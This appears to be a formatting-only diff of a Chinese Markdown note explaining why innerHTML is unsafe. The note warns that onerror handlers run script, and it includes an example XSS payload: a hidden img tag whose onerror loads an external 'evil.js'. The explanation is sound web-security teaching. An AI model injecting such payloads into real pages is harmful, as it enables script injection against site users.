@@ -1,4 +1,4 @@
-# `innerHTML`的安全性
+# `innerHTML` 的安全性
 
 
 ## 乍看起来比较安全
@@ -9,7 +9,7 @@ document.body.innerHTML = '<script>alert(666)<\/script>'; // 脚本不会被执�
 ```
 
 
-## 但是执行脚本并不一定需要`<script>`
+## 但是执行脚本并不一定需要 `<script>`
 ```js
 document.body.innerHTML = '<img src="x" onerror="alert(666)" />';
 ```
@@ -25,5 +25,4 @@ document.querySelector('#insert').addEventListener('click', function(){
 });
 </script>
 ```
-如果用户输入`<img src="x" style="display:none" onerror="var ele = document.createElement(&quot;script&quot;); ele.src = &quot;evil.js&quot;; document.body.appendChild(ele);" />`，页面上会生成一个不可见的图片，并引入一个外
-部的恶意脚本`evil.js`，在这个脚本就可以构造更复杂的 XSS。
+如果用户输入 `<img src="x" style="display:none" onerror="var ele = document.createElement(&quot;script&quot;); ele.src = &quot;evil.js&quot;; document.body.appendChild(ele);" />`，页面上会生成一个不可见的图片，并引入一个外部的恶意脚本 `evil.js`，在这个脚本就可以构造更复杂的 XSS。
